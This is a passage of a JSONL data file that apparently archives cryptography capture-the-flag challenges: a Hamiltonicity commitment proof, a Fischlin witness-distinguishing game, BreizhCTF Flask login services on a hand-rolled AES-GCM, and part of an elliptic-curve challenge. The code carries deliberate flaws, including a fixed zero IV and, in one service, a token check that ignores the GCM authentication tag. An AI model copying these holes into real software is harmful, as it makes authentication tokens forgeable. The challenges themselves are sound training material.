pow(random.randint(2,P-1),2,P)\nh1 = 250335104192448110684442096964171969189371208477846978499544515755228857598805930673171509152681305793789903169450438090936970626429806187630240086681623358732517929314870247393468568111513100989768455673769015138136779312483203922847547169463972757664497001482465636402329003817055202840451714256443734563502\nh2 = 50837518481371967588098771977165879422445597094015682347125264774697010574110399136037637691883034517374621248070926110725252171239208140392324019115211573768989274797050961703999139947885402838647962534519882622024973824201026885393782961783980351898031905383197219266093119145616328556294476943229578292306\ncomm_params = P,q,h1,h2\n\n\n\n# Information theoretically hiding commitment scheme\ndef pedersen_commit(message, pedersen_params = comm_params):\n    P,q,h1,h2 = pedersen_params\n    r = random.randint(0,q)\n    commitment = (pow(h1,message,P) * pow(h2,r,P)) % P\n    return commitment, r\n\ndef pedersen_open(commitment,message,r, pedersen_params = comm_params):\n    P,q,h1,h2 = pedersen_params\n    if (commitment * pow(h1,-message,P) * pow(h2,-r,P) ) % P == 1:\n        return True\n    else:\n        return False\n\n# Given a graph, return an element-wise commitment to the graph\ndef commit_to_graph(G,N):\n    G2 = [[0 for _ in range(N)] for _ in range(N)]\n    openings = [[0 for _ in range(N)] for _ in range(N)]\n    for i in range(N):\n        for j in range(N):\n            v = G[i][j]\n            comm, r = pedersen_commit(v)\n            assert pedersen_open(comm,v,r)\n            G2[i][j] = comm\n            openings[i][j] = [v,r]\n    return G2, openings\n\ndef check_graph(G,N):\n    assert len(G) == N, \"G has wrong size\"\n    for r in G:\n        assert len(r) == N, \"G has wrong size\"\n    return True\n\n# Takes a commitment to a graph, and opens all the commitments to reveal the graph\ndef open_graph(G2,N, openings):\n    G = [[0 for _ in range(N)] for _ in range(N)]\n    for i in range(N):\n        for j in range(N):\n            v = G2[i][j]\n            m,r = openings[i][j]\n            assert pedersen_open(v, m, r)\n            G[i][j] = m\n    return G\n\n\n# Takes a commitment to a graph, and a claimed set of entries which should open a hamiltonian cycle\n# Returns True if the opened nodes form a hamiltonian cycle\ndef testcycle(graph, N, nodes, openings):\n    assert len(nodes) == N\n    from_list = [n[0] for n in nodes]\n    to_list = [n[1] for n in nodes]\n    for i in range(N):\n        assert i in from_list\n        assert i in to_list\n        assert nodes[i][1] == nodes[(i+1)%N][0]\n\n    for i in range(N):\n        src,dst = nodes[i]\n        r = openings[i]\n        # print(f'trying to open {src}->{dst} {r} {graph[src][dst]}')\n        assert pedersen_open(graph[src][dst], 1, r)\n    return True\n\n# Given a graph, and a permutation, shuffle the graph using the permutation\ndef permute_graph(G, N, permutation):\n    G_permuted = [[G[permutation[i]][permutation[j]] for j in range(N)] for i in range(N)]\n    return G_permuted\n\n# given a set of commitment private values, and a subset of these indexes\n# return a vector of the randomness needed to open the commitments.\ndef get_r_vals(openings,N, cycle):\n    rvals = []\n    for x in cycle:\n        m,r = openings[x[0]][x[1]]\n        rvals.append(r)\n    return rvals\n\n\n# Iterated Fiat Shamir, take previous state and current graph\ndef hash_committed_graph(G, state, comm_params):\n    fs_state = sha256(str(comm_params).encode())\n    fs_state.update(state)\n    first_message = \"\".join([str(x) for xs in G for x in xs])\n    fs_state.update(first_message.encode())\n    iterated_state = fs_state.digest()\n    return iterated_state \n\n", "name": "hamiltonicity"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-fischlin\\release_files\\chal.py", "category": "crypto", "solution_code": "../server_files/chal.py", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-fischlin\\release_files\\params.py", "category": "crypto", "solution_code": "../server_files/params.py", "name": "params"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-fischlin\\server_files\\chal.py", "category": "crypto", "solution_code": "import random\nfrom Crypto.Util.number import bytes_to_long\nfrom params import p, q, g\nfrom hashlib import sha512\nimport json\nimport os\n\nFLAG = os.environ[\"FLAG\"].encode()\n\n# kinda a random oracle\ndef Totally_a_random_oracle(a0,a1,e,e0,e1,z0,z1):\n    ROstep = sha512(b'my')\n    ROstep.update(str(a0).encode())\n    ROstep.update(b'very')\n    ROstep.update(str(a1).encode())\n    ROstep.update(b'cool')\n    ROstep.update(str(e).encode())\n    ROstep.update(b'random')\n    ROstep.update(str(e0).encode())\n    ROstep.update(b'oracle')\n    ROstep.update(str(e1).encode())\n    ROstep.update(b'for')\n    ROstep.update(str(z0).encode())\n    ROstep.update(b'fischlin')\n    ROstep.update(str(z1).encode())\n    res = bytes_to_long(ROstep.digest())\n    return res\n\ndef fischlin_proof(w0,w1,y0,y1,b):\n    if b:\n        w_sim, w_b, y_sim, y_b = w0, w1, y0, y1\n    else:\n        w_sim, w_b, y_sim, y_b = w1, w0, y1, y0\n\n    r_b = random.randint(0,q)\n    a_b = pow(g,r_b,p)\n    # Simulate transcript 1\n    e_sim = random.randint(0,2**511-1)\n    z_sim = random.randint(0,q)\n    a_sim = (pow(pow(y_sim,e_sim,p),-1,p) *pow(g,z_sim,p)) % p\n    \n    # Normally you would sample for some `t` rounds, with `rho` parallel iterations\n    # We simplify slightly for the purposes of this challenge. \n    # we just use `t` = 2**10, and `B` = 6, (and for this challenge we ignore parallel repititions/what happens if B is never hit)\n    t = 2**10\n    B = 6\n    for e in range(t):\n        # complete real transcript\n        e_b = e^e_sim\n        z_b = (r_b + e_b*w_b) % q\n\n        # fix blinding\n        if b:\n            a0, a1, e0, e1, z0, z1 = a_sim, a_b, e_sim, e_b, z_sim, z_b\n        else:\n            a1, a0, e1, e0, z1, z0 = a_sim, a_b, e_sim, e_b, z_sim, z_b\n\n        # if result of \"random oracle\" is small enough, we go with this transcript \\o/\n        res = Totally_a_random_oracle(a0,a1,e,e0,e1,z0,z1)\n        if res < 2**(512-B):\n            break\n\n    proof = {}\n    proof[\"a0\"] = a0\n    proof[\"a1\"] = a1\n    proof[\"e\"] = e\n    proof[\"e0\"] = e0\n    proof[\"e1\"] = e1\n    proof[\"z0\"] = z0\n    proof[\"z1\"] = z1\n\n    return proof\n\n\ndef gen_round():\n    w0 = random.randint(0,q)\n    y0 = pow(g,w0,p)\n    w1 = random.randint(0,q)\n    y1 = pow(g,w1,p)\n    assert (y0%p) >= 1 and (y1%p) >= 1\n    assert pow(y0, q, p) == 1 and pow(y1, q, p) == 1\n    return w0, w1, y0, y1\n\nattempts = 2**4\n\nfor round in range(64):\n    print(f'round: {round}')\n    print(f'I will prove knowledge of one of these dlogs, using either w0 or w1')\n    \n    for i in range(attempts):\n        w0,w1,y0,y1 = gen_round()\n\n        print(f'y0 = {y0}')\n        print(f'y1 = {y1}')\n        leak_witness = int(input(\"which witness do you want to see?\"))\n        if leak_witness:\n            print(f'w1 = {w1}')\n        else:\n            print(f'w0 = {w0}')\n\n        # choose which witness will be used for the proof\n        b = int(random.randint(0,1))\n\n        # Gives transcript (a0,a1) e (e0,e1,z0,z1) made using witness `b` where:\n        # (a0,e0,z0) and (a1,e1,z1) are satisfying transcripts\n        # e0 xor e1 = e \n        # RO(a0,a1,e,e0,e1,z0,z1) has `B` leading zeroes\n        proof = fischlin_proof(w0,w1,y0,y1,b)\n\n        print(f'here is your fishlin transcript')\n        print(json.dumps(proof))\n\n        trying = input(\"do you think you can guess my witness? (y,n)\")\n        if trying.lower().startswith(\"n\"):\n            continue\n        else:\n            break\n\n    b_guess = int(input(\"which witness did the prover use?\"))\n    if b == b_guess:\n        print(\"wow you distinguished my witness!\")\n        print(f'do it {64-round} times more for flag!')\n    else:\n        print(\"you didn't guess the right witness\")\n        print(\"skill issue + L + ratio + not able to distinguish the witness in a fischlin transform\")\n        exit()\n\nprint(\"well done, you distinguished all the witnesses!\")\nprint(FLAG)\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ch2024-sigma-fischlin\\server_files\\params.py", "category": "crypto", "solution_code": "# Diffie-Hellman group (512 bits)\n# p = 2*q + 1 where p,q are both prime, and 2 modulo p generates a group of order q\np = 0x1ed344181da88cae8dc37a08feae447ba3da7f788d271953299e5f093df7aaca987c9f653ed7e43bad576cc5d22290f61f32680736be4144642f8bea6f5bf55ef\nq = 0xf69a20c0ed4465746e1bd047f57223dd1ed3fbc46938ca994cf2f849efbd5654c3e4fb29f6bf21dd6abb662e911487b0f9934039b5f20a23217c5f537adfaaf7\ng = 2\n", "name": "params"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-2\\release_files\\template_authentification.py", "category": "crypto", "solution_code": "import requests\n\n\"\"\"\nQuick tutorial to retrieve cookies despite redirections:\nWhen making a /login request, be sure to disable redirections :)\nOtherwise, you wonâ€™t receive the cookie.\n\"\"\"\n\nfrom sys import argv\nif len(argv) != 2:\n    print(\"usage: `python template_authentification_ou_pas.py <URL>`\")\n    exit()\n\nURL = argv[1]\n\n# Register\nurl = f'{URL}/register'\ndata = {\"username\": \"demo\", \"password\": \"demo\"}\n_ = requests.post(url, data=data)\n\n# Login\nurl = f'{URL}/login'\nresponse = requests.post(url, data=data, allow_redirects=False)\nauth = response.cookies[\"auth\"]\n\nprint(auth)\n\n", "name": "template_authentification"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-2\\server_files\\authentification-2\\app.py", "category": "crypto", "solution_code": "from flask import Flask, render_template, request, redirect, url_for, make_response, send_from_directory\nfrom crypto import build_token, verif_token\nfrom gcm import BLOCK_LEN\nimport os\n\napp = Flask(__name__)\n\nFLAG = os.getenv(\"FLAG\", \"BZHCTF{default_flag}\")\nMASTER_KEY = os.urandom(BLOCK_LEN)\nMAX_USERS  = 1 \n\nusers = {}\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n@app.route('/reset-db')\ndef reset_db():\n    global MASTER_KEY\n    global users\n\n    MASTER_KEY = os.urandom(BLOCK_LEN)\n    users = {}\n\n    return render_template('index.html')\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        if username in users and users[username][\"password\"] == password:\n            token = build_token(MASTER_KEY, username, users[username][\"role\"])\n            resp = make_response(redirect(url_for('admin')))\n            resp.set_cookie('auth', token)\n\n            return resp\n\n    return render_template('login.html')\n\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        if len(users) >= MAX_USERS:\n            return redirect(url_for('register')), 403\n\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        if username not in users:\n            users[username] = {\n                \"password\": password,\n                \"role\": \"guest\"\n            }\n\n            return redirect(url_for('login'))\n\n    if len(users) >= MAX_USERS:\n        return render_template('too_many_users.html'), 403\n    else:\n        return render_template('register.html')\n\n@app.route('/admin')\ndef admin():\n    auth_cookie = request.cookies.get('auth')\n\n    try:\n        if auth_cookie == None:\n            msg = \"Please login\"\n        elif verif_token(MASTER_KEY, auth_cookie) == True:\n            msg = f\"Well played! Here is your flag : {FLAG} !!!\"\n        else:\n            msg = \"You are not super_admin :(\"\n    except:\n        msg = \"Error with the token...\"\n\n    return render_template(\"admin.html\", msg=msg)\n\n@app.route('/favicon.ico')\ndef favicon():\n    return send_from_directory(app.static_folder, 'favicon.png')\n\nif __name__ == '__main__':\n    app.run(debug=False, host=\"0.0.0.0\", port=1337)\n\ntheme_colors = {\n    'background': '#000000',\n    'text': '#FFD700',\n    'highlight': '#D40078',\n    'button_bg': '#FFD700',\n    'button_text': '#000000'\n}\n\nlogo_url = \"https://www.breizhctf.com/ims23/logo-prov2024.jpg\"\n\n", "name": "app"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-2\\server_files\\authentification-2\\crypto.py", "category": "crypto", "solution_code": "from json import dumps, loads\nfrom gcm import GCM, IV_LEN\n\nIV  = b\"\\x00\"*IV_LEN\n\ndef build_token(key, username, role):\n    gcm = GCM(key, IV)\n    token = dumps({\n        \"username\": username,\n        \"role\": role\n    }).encode()\n\n    ct, tag = gcm.encrypt(token)\n    return \";\".join([ct.hex(), tag.hex()])\n\ndef verif_token(key, token):\n    gcm = GCM(key, IV)\n    ct, tag = [bytes.fromhex(a) for a in token.split(\";\")]\n    pt, is_auth = gcm.decrypt(ct, tag)\n\n    if loads(pt.decode())[\"role\"] != \"super_admin\":\n        return False\n\n    if not is_auth:\n        return False\n\n    return True\n\n", "name": "crypto"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-2\\server_files\\authentification-2\\gcm\\gcm.py", "category": "crypto", "solution_code": "\"\"\"\n\nTitle       : AES-GCM\nAuthor      : Bill (intern)\nDescription : Implementation â€” algorithm by algorithm â€” of this NIST publication [1].\n              I had to speedrun due to the short duration of my internship.\n              I'm not sure that everything is correct...\n\nReferences :\n    - [1] : https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\n\n\"\"\"\n\nfrom .utils import xor, bytes_to_bits, bits_to_bytes\nfrom Crypto.Cipher import AES\nfrom math import ceil\n\nBLOCK_LEN = 16\nCTR_LEN   = 4\nIV_LEN    = 12\n\nclass GCM:\n    def __init__(self, key, iv):\n        assert len(key) == BLOCK_LEN\n        assert len(iv) == IV_LEN\n\n        self.cipher = AES.new(key, AES.MODE_ECB)\n        self.key = key\n        self.iv  = iv\n        self.H = self.cipher.encrypt(b\"\\x00\"*BLOCK_LEN)\n\n    # 6.2 Incrementing function\n    def inc(self, X: bytes, s=CTR_LEN):\n        assert len(X) == BLOCK_LEN\n        ctr = int.from_bytes(X[-s:], \"big\") + 1\n        return X[:-s] + ctr.to_bytes(s, byteorder=\"big\")\n\n    # Algorithm 1: X*Y\n    def mul(self, X: bytes, Y: bytes):\n        assert len(X) == len(Y) == BLOCK_LEN\n\n        R = bytes_to_bits(b\"\\xe1\" + b\"\\x00\"*(BLOCK_LEN-1))\n        X = bytes_to_bits(X)\n        V = bytes_to_bits(Y)\n        Z = [0x00 for _ in range(BLOCK_LEN*8)]\n\n        for i in range(BLOCK_LEN*8):\n            if X[i] == 0:\n                Z = Z\n            else:\n                Z = [z^v for z,v in zip(Z,V)]\n\n            if V[-1] == 0:\n                V = [0] + V[:-1]\n            else:\n                V = [0] + V[:-1]\n                V = [v^r for v,r in zip(V, R)]\n            \n        return bits_to_bytes(Z)\n\n    # Algorithm 2: GHASH\n    def ghash(self, X: bytes, H: bytes):\n        assert len(X) % BLOCK_LEN == 0\n        assert len(H) == BLOCK_LEN\n\n        Y  = b\"\\x00\"*BLOCK_LEN\n        Xs = [X[i:i+BLOCK_LEN] for i in range(0, len(X), BLOCK_LEN)]\n        m  = len(X)//BLOCK_LEN\n\n        for i in range(m):\n            Y = self.mul(xor(Y, Xs[i]), H)\n\n        return Y\n\n    # Algorithm 3: GCTR\n    def gctr(self, ICB: bytes, X: bytes):\n        assert len(ICB) == BLOCK_LEN\n\n        if X == b\"\":\n            return b\"\"\n\n        Xs = [X[i:i+BLOCK_LEN] for i in range(0, len(X), BLOCK_LEN)]\n        n = ceil(len(X) / BLOCK_LEN)\n        CB = ICB[:]\n        Y = b\"\"\n\n        for i in range(0, n-1):\n            Y += xor(Xs[i], self.cipher.encrypt(CB))\n            CB = self.inc(CB)\n\n        Y += xor(Xs[-1], self.cipher.encrypt(CB)[:len(Xs[-1])])\n        return Y\n\n    def build_tag(self, C, A, J):\n        u = BLOCK_LEN * ceil(len(C)/BLOCK_LEN) - len(C)\n        v = BLOCK_LEN * ceil(len(A)/BLOCK_LEN) - len(A)\n\n        buf =  b\"\"\n        buf += A + b\"\\x00\"*v + C + b\"\\x00\"*u \n        buf += (len(A)*8).to_bytes(8, \"big\") \n        buf += (len(C)*8).to_bytes(8, \"big\")\n\n        S = self.ghash(buf, self.H)\n\n        return self.gctr(J, S)\n\n    # Algorithm 4: GCM-AE_K\n    def encrypt(self, P, A=b\"\"):\n        J = self.iv + b\"\\x00\"*(CTR_LEN-1) + b\"\\x01\"\n        C = self.gctr(J, P)\n        T = self.build_tag(C, A, J)\n\n        return C, T\n\n    # Algorithm 5: GCM-AD_K\n    def decrypt(self, C, T, A=b\"\"):\n        assert len(T) == BLOCK_LEN\n        J = self.iv + b\"\\x00\"*(CTR_LEN-1) + b\"\\x01\"\n        P = self.gctr(J, C)\n\n        TT = self.build_tag(C, A, J)\n        \n        if TT != T:\n            return (P, False)\n\n        return (P, True)\n\n", "name": "gcm"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-2\\server_files\\authentification-2\\gcm\\utils.py", "category": "crypto", "solution_code": "def xor(X, Y):\n    assert len(X) == len(Y)\n    return bytes([x^y for x,y in zip(X, Y)])\n\ndef bytes_to_bits(X: bytes):\n    res = []\n\n    for b in X:\n        for bb in bin(b)[2:].zfill(8):\n            res.append(int(bb))\n\n    return res\n\ndef bits_to_bytes(X):\n    X = [str(x) for x in X]\n    res = []\n\n    for b in range(0, len(X), 8):\n        res.append(int(\"\".join(X[b:b+8]), 2))\n\n    return bytes(res)\n\n", "name": "utils"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-2\\server_files\\authentification-2\\gcm\\__init__.py", "category": "crypto", "solution_code": "# gcm/__init__.py\n\nfrom .gcm import *\nfrom .utils import *\n\n", "name": "__init__"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-1\\release_files\\template_authentification.py", "category": "crypto", "solution_code": "import requests\n\n\"\"\"\nQuick tutorial to retrieve cookies despite redirections:\nWhen making a /login request, be sure to disable redirections :)\nOtherwise, you wonâ€™t receive the cookie.\n\"\"\"\n\nfrom sys import argv\nif len(argv) != 2:\n    print(\"usage: `python template_authentification_ou_pas.py <URL>`\")\n    exit()\n\nURL = argv[1]\n\n# Register\nurl = f'{URL}/register'\ndata = {\"username\": \"demo\", \"password\": \"demo\"}\n_ = requests.post(url, data=data)\n\n# Login\nurl = f'{URL}/login'\nresponse = requests.post(url, data=data, allow_redirects=False)\nauth = response.cookies[\"auth\"]\n\nprint(auth)\n\n", "name": "template_authentification"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-1\\server_files\\authentification-1\\app.py", "category": "crypto", "solution_code": "from flask import Flask, render_template, request, redirect, url_for, make_response, send_from_directory\nfrom crypto import build_token, verif_token\nfrom gcm import BLOCK_LEN\nimport os\n\napp = Flask(__name__)\n\nFLAG = os.getenv(\"FLAG\", \"BZHCTF{default_flag}\")\nMASTER_KEY = os.urandom(BLOCK_LEN)\nMAX_USERS  = 1 \n\nusers = {}\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\n@app.route('/reset-db')\ndef reset_db():\n    global MASTER_KEY\n    global users\n\n    MASTER_KEY = os.urandom(BLOCK_LEN)\n    users = {}\n\n    return render_template('index.html')\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        if username in users and users[username][\"password\"] == password:\n            token = build_token(MASTER_KEY, username, users[username][\"role\"])\n            resp = make_response(redirect(url_for('admin')))\n            resp.set_cookie('auth', token)\n\n            return resp\n\n    return render_template('login.html')\n\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        if len(users) >= MAX_USERS:\n            return redirect(url_for('register')), 403\n\n        username = request.form.get('username')\n        password = request.form.get('password')\n\n        if username not in users:\n            users[username] = {\n                \"password\": password,\n                \"role\": \"guest\"\n            }\n\n            return redirect(url_for('login'))\n\n    if len(users) >= MAX_USERS:\n        return render_template('too_many_users.html'), 403\n    else:\n        return render_template('register.html')\n\n@app.route('/admin')\ndef admin():\n    auth_cookie = request.cookies.get('auth')\n\n    try:\n        if auth_cookie == None:\n            msg = \"Please login\"\n        elif verif_token(MASTER_KEY, auth_cookie) == True:\n            msg = f\"Well played! Here is your flag : {FLAG} !!!\"\n        else:\n            msg = \"You are not super_admin :(\"\n    except:\n        msg = \"Error with the token...\"\n\n    return render_template(\"admin.html\", msg=msg)\n\n@app.route('/favicon.ico')\ndef favicon():\n    return send_from_directory(app.static_folder, 'favicon.png')\n\nif __name__ == '__main__':\n    app.run(debug=False, host=\"0.0.0.0\", port=1337)\n\ntheme_colors = {\n    'background': '#000000',\n    'text': '#FFD700',\n    'highlight': '#D40078',\n    'button_bg': '#FFD700',\n    'button_text': '#000000'\n}\n\nlogo_url = \"https://www.breizhctf.com/ims23/logo-prov2024.jpg\"\n\n", "name": "app"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-1\\server_files\\authentification-1\\crypto.py", "category": "crypto", "solution_code": "from json import dumps, loads\nfrom gcm import GCM, IV_LEN\n\nIV  = b\"\\x00\"*IV_LEN\n\ndef build_token(key, username, role):\n    gcm = GCM(key, IV)\n    token = dumps({\n        \"username\": username,\n        \"role\": role\n    }).encode()\n\n    ct, tag = gcm.encrypt(token)\n    return \";\".join([ct.hex(), tag.hex()])\n\ndef verif_token(key, token):\n    gcm = GCM(key, IV)\n    ct, tag = [bytes.fromhex(a) for a in token.split(\";\")]\n    pt, is_auth = gcm.decrypt(ct, tag)\n\n    if loads(pt.decode())[\"role\"] != \"super_admin\":\n        return False\n\n    return True\n\n", "name": "crypto"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-1\\server_files\\authentification-1\\gcm\\gcm.py", "category": "crypto", "solution_code": "\"\"\"\n\nTitle       : AES-GCM\nAuthor      : Bill (intern)\nDescription : Implementation â€” algorithm by algorithm â€” of this NIST publication [1].\n              I had to speedrun due to the short duration of my internship.\n              I'm not sure that everything is correct...\n\nReferences :\n    - [1] : https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\n\n\"\"\"\n\nfrom .utils import xor, bytes_to_bits, bits_to_bytes\nfrom Crypto.Cipher import AES\nfrom math import ceil\n\nBLOCK_LEN = 16\nCTR_LEN   = 4\nIV_LEN    = 12\n\nclass GCM:\n    def __init__(self, key, iv):\n        assert len(key) == BLOCK_LEN\n        assert len(iv) == IV_LEN\n\n        self.cipher = AES.new(key, AES.MODE_ECB)\n        self.key = key\n        self.iv  = iv\n        self.H = self.cipher.encrypt(b\"\\x00\"*BLOCK_LEN)\n\n    # 6.2 Incrementing function\n    def inc(self, X: bytes, s=CTR_LEN):\n        assert len(X) == BLOCK_LEN\n        ctr = int.from_bytes(X[-s:], \"big\") + 1\n        return X[:-s] + ctr.to_bytes(s, byteorder=\"big\")\n\n    # Algorithm 1: X*Y\n    def mul(self, X: bytes, Y: bytes):\n        assert len(X) == len(Y) == BLOCK_LEN\n\n        R = bytes_to_bits(b\"\\xe1\" + b\"\\x00\"*(BLOCK_LEN-1))\n        X = bytes_to_bits(X)\n        V = bytes_to_bits(Y)\n        Z = [0x00 for _ in range(BLOCK_LEN*8)]\n\n        for i in range(BLOCK_LEN*8):\n            if X[i] == 0:\n                Z = Z\n            else:\n                Z = [z^v for z,v in zip(Z,V)]\n\n            if V[-1] == 0:\n                V = [0] + V[:-1]\n            else:\n                V = [0] + V[:-1]\n                V = [v^r for v,r in zip(V, R)]\n            \n        return bits_to_bytes(Z)\n\n    # Algorithm 2: GHASH\n    def ghash(self, X: bytes, H: bytes):\n        assert len(X) % BLOCK_LEN == 0\n        assert len(H) == BLOCK_LEN\n\n        Y  = b\"\\x00\"*BLOCK_LEN\n        Xs = [X[i:i+BLOCK_LEN] for i in range(0, len(X), BLOCK_LEN)]\n        m  = len(X)//BLOCK_LEN\n\n        for i in range(m):\n            Y = self.mul(xor(Y, Xs[i]), H)\n\n        return Y\n\n    # Algorithm 3: GCTR\n    def gctr(self, ICB: bytes, X: bytes):\n        assert len(ICB) == BLOCK_LEN\n\n        if X == b\"\":\n            return b\"\"\n\n        Xs = [X[i:i+BLOCK_LEN] for i in range(0, len(X), BLOCK_LEN)]\n        n = ceil(len(X) / BLOCK_LEN)\n        CB = ICB[:]\n        Y = b\"\"\n\n        for i in range(0, n-1):\n            Y += xor(Xs[i], self.cipher.encrypt(CB))\n            CB = self.inc(CB)\n\n        Y += xor(Xs[-1], self.cipher.encrypt(CB)[:len(Xs[-1])])\n        return Y\n\n    def build_tag(self, C, A, J):\n        u = BLOCK_LEN * ceil(len(C)/BLOCK_LEN) - len(C)\n        v = BLOCK_LEN * ceil(len(A)/BLOCK_LEN) - len(A)\n\n        buf =  b\"\"\n        buf += A + b\"\\x00\"*v + C + b\"\\x00\"*u \n        buf += (len(A)*8).to_bytes(8, \"big\") \n        buf += (len(C)*8).to_bytes(8, \"big\")\n\n        S = self.ghash(buf, self.H)\n\n        return self.gctr(J, S)\n\n    # Algorithm 4: GCM-AE_K\n    def encrypt(self, P, A=b\"\"):\n        J = self.iv + b\"\\x00\"*(CTR_LEN-1) + b\"\\x01\"\n        C = self.gctr(J, P)\n        T = self.build_tag(C, A, J)\n\n        return C, T\n\n    # Algorithm 5: GCM-AD_K\n    def decrypt(self, C, T, A=b\"\"):\n        assert len(T) == BLOCK_LEN\n        J = self.iv + b\"\\x00\"*(CTR_LEN-1) + b\"\\x01\"\n        P = self.gctr(J, C)\n\n        TT = self.build_tag(C, A, J)\n        \n        if TT != T:\n            return (P, False)\n\n        return (P, True)\n\n", "name": "gcm"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-1\\server_files\\authentification-1\\gcm\\utils.py", "category": "crypto", "solution_code": "def xor(X, Y):\n    assert len(X) == len(Y)\n    return bytes([x^y for x,y in zip(X, Y)])\n\ndef bytes_to_bits(X: bytes):\n    res = []\n\n    for b in X:\n        for bb in bin(b)[2:].zfill(8):\n            res.append(int(bb))\n\n    return res\n\ndef bits_to_bytes(X):\n    X = [str(x) for x in X]\n    res = []\n\n    for b in range(0, len(X), 8):\n        res.append(int(\"\".join(X[b:b+8]), 2))\n\n    return bytes(res)\n\n", "name": "utils"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\BreizhCTF2025_Authentification-1\\server_files\\authentification-1\\gcm\\__init__.py", "category": "crypto", "solution_code": "# gcm/__init__.py\n\nfrom .gcm import *\nfrom .utils import *\n\n", "name": "__init__"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\AIS3PreExam_pekobot\\release_files\\elliptic_curve.py", "category": "crypto", "solution_code": "../server_files/elliptic_curve.py", "name": "elliptic_curve"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\AIS3PreExam_pekobot\\release_files\\server.py", "category": "crypto", "solution_code": "../server_files/server.py", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\AIS3PreExam_pekobot\\server_files\\elliptic_curve.py", "category": "crypto", "solution_code": "class Curve:\n    def __init__(self, p, a, b):\n        self.p = p\n        self.a = a\n        self.b = b\n\n    def __eq__(self, other):\n        if isinstance(other, Curve):\n            return self.p == other.p and self.a == other.a and self.b == other.b\n        return None\n\n    def __str__(self):\n        return \"y^2 = x^3 + %dx + %d over F_%d\" % (self.a, self.b, self.p)\n\n\nclass Point:\n    def __init__(self, curve, x, y):\n        if curve == None:\n            self.curve = self.x = self.y = None\n            return\n        self.curve = curve\n        self.x = x % curve.p\n        self.y = y % curve.p\n\n    def __str__(self):\n        if self == INFINITY:\n            return \"INF\"\n        return \"(%d, %d)\" % (self.x, self.y)\n\n    def __eq__(self, other):\n        if isinstance(other, Point):\n            return self.curve == other.curve and self.x == other.x and self.y == other.y\n        return None\n\n    def __add__(self, other):\n        if not isinstance(other, Point):\n            return None\n        if other == INFINITY:\n            return self\n        if self == INFINITY:\n            return other\n        p = self.curve.p\n        if self.x == other.x:\n            if (self.y + other.y) % p == 0:\n                return INFINITY\n            else:\n                return self.double()\n        p = self.curve.p\n        l = ((other.y - self.y) * pow(other.x - self.x, -1, p)) % p\n        x3 = (l * l - self.x - other.x) % p\n        y3 = (l * (self.x - x3) - self.y) % p\n        return Point(self.curve, x3, y3)\n\n    def __neg__(self):\n        return Point(self.curve, self.x, self.curve.p - self.y)\n\n    def __mul__(self, e):\n        if e == 0:\n            return INFINITY\n        if self == INFINITY:\n            return INFINITY\n        if e < 0:\n            return (-self) * (-e)\n        ret = self * (e // 2)\n        ret = ret.double()\n        if e % 2 == 1:\n            ret = ret + self\n        return ret\n\n    def __rmul__(self, other):\n        return self * other\n\n    def double(self):\n        if self == INFINITY:\n            return INFINITY\n        p = self.curve.p\n        a = self.curve.a\n        l = ((3 * self.x * self.x + a) * pow(2 * self.y, -1, p)) % p\n        x3 = (l * l - 2 * self.x) % p\n        y3 = (l * (self.x - x3) - self.y) % p\n        return Point(self.curve, x3, y3)\n\n\nINFINITY = Point(None, None, None)\n", "name": "elliptic_curve"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\AIS3PreExam_pekobot\\server_files\\server.py", "category": "crypto", "solution_code": "from elliptic_curve import Curve, Point\nfrom Crypto.Util.number import bytes_to_long\nimport os\nfrom random import choice\nfrom secrets import randbelow\n\nflag = os.environb[b\"FLAG\"]\nassert flag.startswith(b\"AIS3{\")\nassert flag.endswith(b\"}\")\nflag += os.urandom(64 - len(flag))\n\n# NIST P-256\na = -3\nb = 41058363725152142129326129780047268409114441015993725554835256314039467401291\np = 2**256 - 2**224 + 2**192 + 2**96 - 1\nE = Curve(p, a, b)\nn = 115792089210356248762697446949407573529996955224135760342422259061068512044369\nGx = 48439561293906451759052585252797914202762949526041747995844080717082404635286\nGy = 36134250956749795798585127919587881956611106672985015071877198253568414405109\nG = Point(E, Gx, Gy)\n\nd = randbelow(n)\nP = G * d\n\n\ndef point_to_bytes(P):\n    return P.x.to_bytes(32, \"big\") + P.y.to_bytes(32, \"big\")\n\n\ndef encrypt(P, m):\n    key = point_to_bytes(P)\n    return bytes([x ^ y for x, y in zip(m.ljust(64, b\"\\0\"), key)])\n\n\nquotes = [\n    \"Konpeko, konpeko, konpeko! 